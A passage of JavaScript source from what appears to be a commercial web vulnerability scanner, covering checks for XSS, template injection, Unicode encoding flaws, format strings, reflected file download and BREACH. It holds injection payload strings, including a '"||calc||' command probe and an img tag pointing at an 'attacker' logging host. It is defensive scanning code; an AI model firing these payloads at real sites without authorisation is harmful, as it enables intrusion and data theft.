		var inputValue = this.origValue + prefix + "{{1==1}}" + postfix;
					
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var possibleEncodings = [
            this.origValue + prefix + "{{1==1}}" + postfix,
            this.origValue + prefix + "&#x7b;&#x7b;1&#x3d;&#x3d;1&#x7d;&#x7d;" + postfix,
            this.origValue + prefix + "&#x7b;&#x7b;1==1&#x7d;&#x7d;" + postfix,
            this.origValue + prefix + "&#123;&#123;1==1&#125;&#125;" + postfix,
            this.origValue + prefix + "&#123;&#123;1&#61;&#61;1&#125;&#125;" + postfix,
            this.origValue + prefix + "&#x7b;&#x7b;&#x31;&#x3d;&#x3d;&#x31;&#x7d;&#x7d;" + postfix,
            this.origValue + prefix + "&#x0007B;&#x0007B;&#x00031;&#x0003D;&#x0003D;&#x00031;&#x0007D;&#x0007D;" + postfix
        ];
        for (var j=0; j<possibleEncodings.length; j++) {
            var tempInputValue = possibleEncodings[j];
            var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
            for (var i = 0; i < founds.length; i++) {
                if (CompareObjects(this.found, founds[i])) {
                    this.alertAngularJSTemplateInjection(inputValue);
                    return false;
                }
            }
        }
		return true;
	}
    
	/**************************************************************************************************************/
	classXSS.prototype.testForUnicodeEncodingProblems = function()
	{
        if (this.foundUnicodeProblems) return true;
        
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 1000 + random(9999);
        
        var startMarker = "acu" + rndStr;
        var endMarker   = "uca" + rndStr;
            
        var problems = "";
        
        // first, let's test for best-fit mappings
		var inputValue = startMarker + '%EF%BC%9Cs1' + '%EF%B9%A5s2' + '%CA%BAs3' + '%CA%B9' + endMarker;
		if (this.request(inputValue, true)) {        
            // find all occurences in the response
                        
            var body = this.lastJob.response.body;
            // look for startMarker
            var start = 0;            
            do 
            {
                var startPos = body.indexOf(startMarker, start);
                if (startPos >= 0) {
                    //trace(startPos);
                    start = startPos + 1;
                    // find the first separator
                    sep1 = body.indexOf('s1', startPos + startMarker.length);
                    if (sep1 > 0) {
                           firstChar = body.substr(startPos + startMarker.length, sep1-startPos-startMarker.length);
                           if (firstChar == '<') {
                           	   //trace('here1');
                           	   //trace(body.substr(startPos, 50));
                               problems += "[li]Unicode character [bold]U+FF1C FULLWIDTH LESS-THAN SIGN[/bold] (encoded as [dark][bold]%EF%BC%9C[/bold][/dark]) was transformed into [bold]U+003C LESS-THAN SIGN[/bold] ([bold][dark]<[/dark][/bold])[/li]";
                           }
                               
                            // find the second separator
                            sep2 = body.indexOf('s2', sep1);
                            if (sep2 > 0) {
                                    secondChar = body.substr(sep1 + 2, sep2-sep1-2);
                                    if (secondChar == '>') {
                                    	//trace('here2');
                                        problems += "[li]Unicode character [bold]U+FE65 SMALL GREATER-THAN SIGN[/bold] (encoded as [dark][bold]%EF%B9%A5[/bold][/dark]) was transformed into [bold]U+003E GREATER-THAN SIGN[/bold] ([bold][dark]>[/dark][/bold])[/li]";
                                    }
                                                                        
                                    // find the third separator
                                    sep3 = body.indexOf('s3', sep2);
                                    if (sep3 > 0) {
                                        thirdChar = body.substr(sep2 + 2, sep3-sep2-2);
                                        if (thirdChar == '"') {
                                        	//trace('here3');
                                            problems += "[li]Unicode character [bold]U+02BA MODIFIER LETTER DOUBLE PRIME[/bold] (encoded as [dark][bold]%CA%BA[/bold][/dark]) was transformed into [bold]U+0022 QUOTATION MARK[/bold] ([bold][dark]\"[/dark][/bold])[/li]";
                                        }
                                                                                
                                        // find the endMarker
                                        endPos = body.indexOf(endMarker, sep3);
                                        if (endPos > 0) {
                                            fourthChar = body.substr(sep3 + 2, endPos-sep3-2);
                                            if (fourthChar == "'") {
                                        		//trace('here4');
                                                problems += "[li]Unicode character [bold]U+02B9 MODIFIER LETTER PRIME[/bold] (encoded as [dark][bold]%CA%B9[/bold][/dark]) was transformed into [bold]U+0027 APOSTROPHE [/bold] ([bold][dark]'[/dark][/bold])[/li]";
                                            }
                                        }
                                    }
                            }        
                    }
                }                                    
            } while (startPos >= 0);   
            
            errorMessages.checkForError(this.lastJob, this.scheme, this.inputIndex, inputValue);         
        }
		
        if (problems.length>0) {
            this.foundUnicodeProblems = true;
            this.alertUnicodeProblems(inputValue, problems);			
        }		
        
        problems = "";
		
		rndStr = 1000 + random(9999);
		startMarker = "acux" + rndStr;
		endMarker   = "xuca" + rndStr;	
				
        // second, let's look for Overlong sequences
		var inputValue = startMarker + '%C0%BEz1' + '%C0%BCz2' + 'a%90bc' + endMarker;
		if (this.request(inputValue, true)) {        
            // find all occurences in the response
                        
            var body = this.lastJob.response.body;
            // look for startMarker
            var start = 0;            
            do 
            {
                var startPos = body.indexOf(startMarker, start);
                if (startPos >= 0) {
                    //trace(startPos);
                    start = startPos + 1;
                    // find the first separator
                    sep1 = body.indexOf('z1', startPos + startMarker.length);
                    if (sep1 > 0) {
                           firstChar = body.substr(startPos + startMarker.length, sep1-startPos-startMarker.length);
                           if (firstChar == '>') {
                               problems += "[li]Unicode character [bold]U+003E GREATER-THAN SIGN[/bold] (encoded in Overlong form [dark][bold]C0%BE[/bold][/dark]) was converted to the short form ([bold][dark]>[/dark][/bold])[/li]";
                           }
                            // find the second separator
                            sep2 = body.indexOf('z2', sep1);
                            
                            if (sep2 > 0) {
                                secondChar = body.substr(sep1 + 2, sep2-sep1-2);
                                if (secondChar == "<") {
                                    problems += "[li]Unicode character [bold]U+003C LESS-THAN SIGN[/bold] (encoded in Overlong form [dark][bold]%C0%BC[/bold][/dark]) was converted to the short form ([bold][dark]<[/dark][/bold])[/li]";
                                }
                                
                                // find the last separator  
                                endPos = body.indexOf(endMarker, sep2); 
                                if (endPos > 0) {
                                    fourthStr = body.substr(sep2 + 2, endPos-sep2-2);
                                    //trace(fourthStr);
                                    
                                    if (fourthStr == "ac") 
                                    {
                                        problems += "[li]Ill-Formed Subsequence [bold][dark]a%90bc[/dark][/bold] was transformed into [bold][dark]" + fourthStr + "[/dark][/bold].[/li]";
                                    }
                                }
                            }
                    }
                }                                    
            } while (startPos >= 0);    
            
            errorMessages.checkForError(this.lastJob, this.scheme, this.inputIndex, inputValue);                        
        }		
				
        if (problems.length>0) {
            this.foundUnicodeProblems = true;
            this.alertUnicodeProblems(inputValue, problems);			
        }
		
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testForMySQLTruncationTests = function(foundsLength, foundsIndex)
    {
        var rndStr = randStr(5);
        var startMarker = "acu" + rndStr;
        var endMarker   = "uca" + rndStr;
        var inputValue = startMarker + "%F0%9D%8C%86" + endMarker;
        var prefix    = startMarker;
        var postfix   = endMarker;
        if (this.request(inputValue, true)) {
            if(this.lastJob.response.body.indexOf(prefix) != -1) {
                var foundsPrefix = SearchInputInResponse(startMarker, this.lastJob.response.body);
                var foundsPostfix = SearchInputInResponse(endMarker, this.lastJob.response.body);
                if (foundsPrefix.length > 0 && foundsPostfix.length < foundsPrefix.length) {
                    //trace("input was truncated, need confirmation");
                    // let's try with 3 bytes, it should not be truncated
                    var inputValue3B = startMarker + "%E4%B8%80" + endMarker;
                    if (this.request(inputValue3B, true)) {
                        if(this.lastJob.response.body.indexOf(prefix) != -1) {
                            var founds3BPrefix  = SearchInputInResponse(startMarker, this.lastJob.response.body);
                            var founds3BPostfix = SearchInputInResponse(endMarker, this.lastJob.response.body);
                            if (founds3BPrefix.length > 0 && founds3BPostfix.length == founds3BPrefix.length) {
                                //trace("3b was not truncated");
                                if (this.request(inputValue, true)) {
                                    var details = "The following tests were performed: [break][ul]";
                                    details = details + "[li]The user input is reflected in the response body[/li]";
                                    details = details + "[li]Strings containing an UTF8 4-byte character ([dark]%F0%9D%8C%86[/dark]) were truncated.[/li]";
                                    details = details + "[li]Strings containing an UTF8 3-byte character (%E4%B8%80) were NOT truncated.[/li]";
                                    details = details + "[/ul]";
                                    this.alertTruncationProblems("MySQL_Truncation_UTF8_FourBytes.xml", inputValue, details);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
	/**************************************************************************************************************/
	classXSS.prototype.testForFormatStringsProblems = function()
	{
		// function to see if the data contains only digits, printable chars and spaces
		function confirmFormatStringData(input){
			var pattern = /[\d\w\s]+/;
			return pattern.test(input);
		}
		
		//trace("testForFormatStringsProblems");
		
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 100 + random(99);
        
        var startMarker = "acu" + rndStr;
        var endMarker   = "uca" + rndStr;
            
        // second, let's look for Overlong sequences
		var inputValue = startMarker + '%6x' + endMarker + "AAAAA";
		if (this.request(inputValue, true)) {        
            // find all occurences in the response
                        
            var body = this.lastJob.response.body;
            // look for startMarker
            var start = 0;            
            do 
            {
                var startPos = body.indexOf(startMarker, start);
                if (startPos >= 0) {
                    //trace(startPos);
                    start = startPos + 1;
                    
                    // look for the endMarker
                    endPos = body.indexOf(endMarker, start);
                    //trace(endPos);
                    
                    //trace(endPos-startPos-startMarker.length);
                    if (endPos-startPos-startMarker.length == 6) 
                    {
                    	var fsData = body.substr(startPos + startMarker.length, startPos + startMarker.length + 6);                    
                    	if (fsData.length < 25 && confirmFormatStringData(fsData) && !fsData.startsWith("&#") && fsData.indexOf("x256x")==-1)
                    	{
				//trace(fsData);	
                    		this.alertFormatStringVuln(inputValue, body.substr(startPos, startMarker.length + endMarker.length + 6 + 5));			
                    	}
                    }
                }                                    
            } while (startPos >= 0);    
            
            errorMessages.checkForError(this.lastJob, this.scheme, this.inputIndex, inputValue);                        
        }
		
		return true;
	}	        	
	
	/**************************************************************************************************************/
	classXSS.prototype.testForReflectedFileDownload = function()
	{
		var schemeInputType = this.scheme.getInputTypeStr(this.inputIndex);
		
		// only test for GET input types
		if (schemeInputType == 'URL encoded GET') {			
			
			var inputValue = this.origValue + '"||calc||';		
			
			var pathVariants = [];
			// case 1: /index.php/x.bat?
			pathVariants.push(this.scheme.path + "/file.bat");
			
			var lastSlashPos = this.scheme.path.lastIndexOf('/');
			var pathWitoutFileName = this.scheme.path.substring(0, lastSlashPos + 1);
			var fileName = this.scheme.path.substring(lastSlashPos + 1);
			
			var fileNameWithoutExtension = fileName;
			var lastDotPos = fileName.lastIndexOf('.');
			if (lastDotPos) {		
				fileNameWithoutExtension = fileName.substr(0, lastDotPos);
			}
			// case 2: index;/file.bat;?	
			pathVariants.push(pathWitoutFileName + fileName + ";/file.bat;");
			
			// case 3: index;/file.bat?	
			pathVariants.push(pathWitoutFileName + fileName + ";/file.bat");
			// try all variants to see if something works
			for (var i=0; i<pathVariants.length; i++) {
				var fullPath = pathVariants[i];			
				
				if (!this.request(inputValue, false, fullPath)) {if (this.classXSSInURI) return true; else return false;}
				var tempInputValue = inputValue;
		            
				var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);		
		        for (var j=0; j<founds.length; j++) {
		            if (CompareObjects(this.found, founds[j]))
		            {		
		    			this.alertRFD(inputValue, fullPath);				
		    			return false;
		            }
				}
			}
		}
		return true;
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.testHTMLTagInjection = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix + "<ifRAme sRc=" + rndStr + ".com></IfRamE>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=iframe|src=" + rndStr + ".com")) 
            {			
			    this.alertHTMLInjection(inputValue);	
			    return false;
		    }			
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testHTMLTagInjectionRandomTag = function(prefix)
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        var tagName = randStr(6);
        var inputValue = prefix + "<" + tagName + " x=" + rndStr + ">";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=" + tagName + "|x=" + rndStr))
        {
            this.alertHTMLInjection(inputValue);
            return false;
        }
        return true;
    }
	/**************************************************************************************************************/
	classXSS.prototype.testHTMLTagInjectionNonTerminatedParam = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix + "<img sRc='http://attacker-" + rndStr + "/log.php?";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=img|src^http://attacker-" + rndStr + "/log.php?")) 
            {			
            	var extraDetails = "This is a non-terminated parameter HTML injection. Consult [i]Postcards from the post-XSS world[/i] web reference for more information about this injection.";
			    this.alertHTMLInjection(inputValue, extraDetails);	
			    return false;
		    }			
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.makeNonXSSTests = function()
    {
        // test for SSL CRIME attack (complete waste of time and requests)
        this.testForCRIMEattack();
        for (var j=0; j < this.founds.length; j++)
        {
            this.found = this.founds[j];
            if (debug) traceObject(this.found);
            // generic tests, not dependent on content type value
            // unicode tests (best-fit mapping, overlong)
            this.testForUnicodeEncodingProblems();
            // mysql truncation tests
            // this.testForMySQLTruncationTests();
            // inside text (JSONP)
            if (this.found.insideText && this.found.inputFoundAt==0) this.testUnvalidatedJSONP();
            // server side template injection
            this.testServerSideTemplateInjection();
        }
    }
	/**************************************************************************************************************/
	classXSS.prototype.makeTests = function()
    {
        this.foundUnicodeProblems = false;
        
        for (var j=0; j < this.founds.length; j++) 
        {    
            this.found = this.founds[j];
            if (debug) traceObject(this.found);
            // make tests depending on the content type value
            if (this.documentType == documentType_invalid) {
                // invalid content type, check for content-sniffing
                
                // test for reflected file download (RFD)                
                var ct = this.lastJob.response.headerValue('content-type').toLowerCase().trim();
                var cd = this.lastJob.response.headerValue('content-disposition').toLowerCase().trim();;
                	
                if (ct != "") {                	
                	if (ct.startsWith("application/json") ||  
                		ct.startsWith("application/x-javascript") ||
                		ct.startsWith("application/javascript") ||                			
                		ct.startsWith("text/json") ||
                		ct.startsWith("text/x-javascript") ||
                		ct.startsWith("text/javascript")
                		)
					{                		
	                	// test RFD
	                	// if must not have a content-disposition or content-disposition not to have filename
						if (cd == "" || cd.indexOf("filename") == -1)
	                		this.testForReflectedFileDownload();
                	}
                }
                // inside text
                if (this.found.insideText && !this.testSimpleScriptTagInjection()) continue;
        		// single quotes
        		if (this.found.insideTagDoubleQuotes && !this.testInsideParamInjection('"')) continue;
                // double quotes
        		if (this.found.insideTagSingleQuotes && !this.testInsideParamInjection("'")) continue;
        		// inside comment
        		if (this.found.insideComment && !this.testInsideCommentInjection()) continue;
                if (this.found.insideComment && !this.testInsideCommentInjectionEndWithBackTick()) continue;
            }
            
            else            	
            if (this.documentType == documentType_xml) {
                // content-type xml                
                
                // inside text
                if (this.found.insideText && !this.testHTMLinsideXML()) continue;
                // inside tag
                if (this.found.insideTagSingleQuotes && !this.testHTMLinsideXMLwithQuote("'")) continue;
                if (this.found.insideTagDoubleQuotes && !this.testHTMLinsideXMLwithQuote('"')) continue;  
                // inside comment              
                if (this.found.insideComment && !this.testHTMLinsideXMLComment()) continue;                
            }            
            
            else 
            {            
                // content-type html
                if (debug) traceObject(this.found);
        		// inside text
        		if (this.found.insideText && !this.testSimpleScriptTagInjection()) continue;
        		if (this.found.insideText && !this.testSimpleScriptTagInjectionWithoutEncoding()) continue;
        		if (this.found.insideText && !this.testScriptTagInjectionAgainstStringReplace()) continue;        		
        		if (this.found.insideText && !this.testScriptTagVariantInjection()) continue;
        		if (this.found.insideText && !this.testScriptTagSrcInjection()) continue;
        		if (this.found.insideText && !this.testScriptTagNullCharASPNET_v11_Injection()) continue;
                if (this.found.insideText && !this.testVideo()) continue;		
                if (this.found.insideText && !this.testSVG()) continue;		
                // if (this.found.insideText && !this.testSVGDoubleEncoded()) continue;
        		if (this.found.insideText && !this.testISINDEX()) continue;        		
        		// if (this.found.insideText && !this.testDivTagWithExpressionInjection()) continue;
        		if (this.found.insideText && !this.testIFrameWithDataUrl()) continue;
        		if (this.found.insideText && !this.testBodyOnLoad()) continue;			
        		if (this.found.insideText && !this.testImgOnLoad()) continue;			
                if (this.found.insideText && !this.testImgSrcError()) continue;            
                if (this.found.insideText && !this.testImgSrcError2()) continue;    
        		if (this.found.insideText && !this.testDoubleEncoded()) continue;
                if (this.found.insideText && !this.testUnicodeDecoded()) continue;
        		if (this.found.insideText && !this.testHTMLEncoded()) continue;
        		if (this.found.insideText && !this.testUnicodeImg()) continue;
        		if (this.found.insideText && !this.testInputAutoFocus()) continue;		
                if (this.found.insideText && (this.lastJob.response.msg2 == 500) && !this.testDotNetValidationBypass()) continue;
                if (this.found.insideText && !this.testAHref()) continue;
        		if (this.found.insideText && !this.testBBCODE()) continue;
        		if (this.found.insideText && !this.testDjangoStripTags()) continue;   
        		if (this.found.insideText && !this.testInsideStyleTag()) continue;
                if (this.found.insideText && !this.testContentEditable()) continue;
                // simple tag injection with postfix (like file.txt%0A<script>alert('hello')</script>)	
                if (this.found.insideText && !this.testSimpleScriptTagInjection(randStr(5) + '\n')) continue;
                
                // AngularJS        		
        		if (this.found.insideAngularJs && !this.testAngularJsInjection()) continue;
        				
        		// inside tag
        		
        		// single quotes
        		if (this.found.insideTagDoubleQuotes && !this.testInsideParamInjection('"')) continue;
                if (this.found.insideTagDoubleQuotes && !this.testInsideParamInjectionUnicodeEncoded('"')) continue;
                if (this.found.insideTagDoubleQuotes && !this.testInsideParamInjectionDoubleEncoded('"')) continue;
        		if (this.found.insideTagDoubleQuotes && !this.testUnicodeInsideQuotes('"')) continue;
                if (this.found.insideTagDoubleQuotes && !this.testInsideParamInjectionStyleVariant('"')) continue;
                if (this.found.insideTagDoubleQuotes && !this.testInsideQuotesCloseScriptTag('"')) continue;
                // double quotes
        		if (this.found.insideTagSingleQuotes && !this.testInsideParamInjection("'")) continue;
                if (this.found.insideTagSingleQuotes && !this.testInsideParamInjectionUnicodeEncoded("'")) continue;
                if (this.found.insideTagSingleQuotes && !this.testInsideParamInjectionDoubleEncoded("'")) continue;
        		if (this.found.insideTagSingleQuotes && !this.testUnicodeInsideQuotes("'")) continue;
                if (this.found.insideTagSingleQuotes && !this.testInsideParamInjectionStyleVariant("'")) continue;
                if (this.found.insideTagSingleQuotes && !this.testInsideQuotesCloseScriptTag("'")) continue;
                
        		if (this.found.insideTag && !this.testInsideTagInjection()) continue;
                if (this.found.insideTag && !this.testInsideTagNoQuotes()) continue;    
        		
        		// inside title
        		if (this.found.insideTitle && !this.testInsideTitleInjection()) continue;
        		
        		// inside textarea
        		if (this.found.insideTextarea && !this.testInsideTextareaInjection()) continue;			
        		
        		// inside comment
        		if (this.found.insideComment && !this.testInsideCommentInjection()) continue;
                if (this.found.insideComment && !this.testInsideCommentInjectionEndWithBackTick()) continue;
                if (this.found.insideComment && !this.testInsideCommentInjectionIECondCommments()) continue;
        		
        		// inside script
        		if (this.found.insideScript && !this.testInsideScriptInjection()) continue;
                if (this.found.insideScript && !this.testInsideScriptInjectionDoubleEncoded()) continue;
                if (this.found.insideScript && !this.testInsideScriptInjectionByClosingScriptTag()) continue;			                
                
        		// <a href="javascript:[injectionhere]" or <a href="#" onclick="[injectionhere]"
        		if (this.found.insideJavascript && !this.testinsideJavascriptInjection()) continue;			
        		if (this.found.insideJavascript && !this.testinsideJavascriptInjectionHTMLEnt()) continue;
                if (this.found.insideJavascript && !this.testinsideJavascriptInjectionImproperHTMLEncoding(this.found)) continue;
				if (this.found.insideJavascript && this.found.insideScriptPosition === 0 && !this.testinsideJavascriptEventHandlerControl()) continue;
                // Same Origin Method Execution (SOME)
                if (this.found.insideScript && !this.found.insideScriptSingleQuote && !this.found.insideScriptDoubleQuote) this.testSOME();
                //  <meta http-equiv="refresh" content="0;url=javascript:alert(1);" />
        		if (this.found.insideMetaRefresh && !this.testinsideMetaRefreshInjection()) continue;			
                // <a href=xxxx>
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjection()) continue;
                
                // <a href=xxxx> (homakov variant)
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjection('/*\nhttp://www.vulnweb.com\n*/')) continue;
                
                // a href=xxxx with HTML entities like <a href=javascript&colon;alert&lpar;1&rpar;>a</a>
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjectionHTMLEntities()) continue;
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjectionHTMLEntities2()) continue;
                
                // a href=xxxx - various snuck variants
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjectionSnuck1()) continue;
                if (this.found.insideFormActionAHref && !this.testinsideFormActionInjectionSnuck2()) continue;
                
                // ruby on rails
                if (this.classXSSInURI && this.found.insideText && !this.testRubyOnRailsVuln()) return;
                
                // HTML tag injection
                if (this.found.insideText && !this.testHTMLTagInjection()) continue;
                if (this.found.insideText && !this.testHTMLTagInjectionRandomTag()) continue;
                if (this.found.insideText && !this.testHTMLTagInjectionNonTerminatedParam()) continue;
            }
        }
    }
    
	/**************************************************************************************************************/
	classXSS.prototype.testForCRIMEattack = function()          
    {
    	// don't report twice
    	var CRIMEAttackReported = getGlobalValue("CRIMEAttack");    	
    	if (CRIMEAttackReported) return;
    		
 		// the input was reflected into page?
 		if (this.founds.length>0 ) { 			
 			var schemeInputType = this.scheme.getInputTypeStr(this.inputIndex);
 			var schemeInputName = this.scheme.getInputName(this.inputIndex); 			
 			
 			if (schemeInputType == 'URL encoded GET' ||  schemeInputType == 'URL encoded POST') {
				// check if over http/https					
				var http = new THTTPJob();
				http.url = this.targetUrl;
				this.scheme.populateRequest(http);
			
				if (http.secure) {					
					var oce = this.lastJob.response.headerValue('Original-Content-Encoding')
					if (oce && oce.toLowerCase() == 'gzip') {
						// look for CSRF tokens					
						var foundCSRFTOKEN = "";
						var tokens = htmlTokens(this.lastJob.response.body);
						var token = null;
							
						while (token = tokens.nextToken()) {
							// marker is present in token?
							if (token.isTag) {
				                
								// look for A HREF
				                if (token.tagName == 'INPUT')
				                {
				                	var inputName = "";
				                	var inputType = "";			                	
				                	
									for(var j=0; j<token.paramCount; j++) {
										var paramName = token.getParamName(j).toLowerCase();
										var paramValue = token.getParamValue(j);	                        
										if (paramName == "type") 
				                        {
				                        	inputType = paramValue.toLowerCase();
				                        }
										
										if (paramName == "name") 
				                        {
				                        	inputName = paramValue;
				                        }
				                    }
				                    
				                    if (inputType == "hidden" && (inputName.toLowerCase().indexOf("token") != -1 || inputName.toLowerCase().indexOf("csrf") != -1) || inputName.toLowerCase() == '__VIEWSTATE') {
				                    	foundCSRFTOKEN = inputName;
				                    }
				                }			                
							}		                
						}					
						
						// found something?
						if (foundCSRFTOKEN) {
							//trace("foundCSRFTOKEN  " + foundCSRFTOKEN);		
							//trace(schemeInputName);				
							//trace(schemeInputType);
							
							var details = 'This alert was issued because the following conditions were met:[break][ul]';
							details = details + "[li]The page content is served via HTTPS[/li]";
							details = details + "[li]The server is using HTTP-level compression[/li]";
							details = details + "[li]" + schemeInputType + " input [bold][dark]" + schemeInputName + "[/dark][/bold] was reflected into the HTTP response body.[/li]";
							details = details + "[li]HTTP response body contains a secret named [bold][dark]" + foundCSRFTOKEN + "[/dark][/bold][/li]";
							details = details + "[/ul]";							
							
							this.alertBREACHattack(details);
							
							setGlobalValue("CRIMEAttack", 1, true);
						}
					}				
				}
			}
		}
    }    
        
	/**************************************************************************************************************/
	classXSS.prototype.startTesting = function()
	{
		// don't test on Headers
        var inputType = this.scheme.getInputTypeStr(this.inputIndex);
        var inputName = this.scheme.getInputName(this.inputIndex);
        
        if (inputType == 'HTTP Header') return;
        //LogError(scheme.path + " " + inputType + "/" + inputName);
		
		//trace(this.scheme.getInputName(this.inputIndex));
		//if (this.scheme.getInputName(this.inputIndex) == 'topicVersionId')
		for (var i=0; i < this.variations.count; i++) 
		{
            // don't test further variations
            if (this.foundVulnOnVariation) break;
			this.currentVariation = i;
            var shouldTestXSSVariants = true;
           	// hack: test for XSS-es inside the exception pages (1)
			if (!this.testXSSInsideException(true)) {shouldTestXSSVariants = false;}
           	// test for XSS-es inside the exception pages (2) - without original value
			if (shouldTestXSSVariants && !this.testXSSInsideException()) {shouldTestXSSVariants = false;}
			
            // test reflection
			if (!this.testReflection()) continue;
			// generic tests (not XSS related)
			this.makeNonXSSTests();
			
            // start making XSS tests
            if (shouldTestXSSVariants) // don't test if an XSS was found before with testXSSInsideException
                this.makeTests();
		}
	}	
}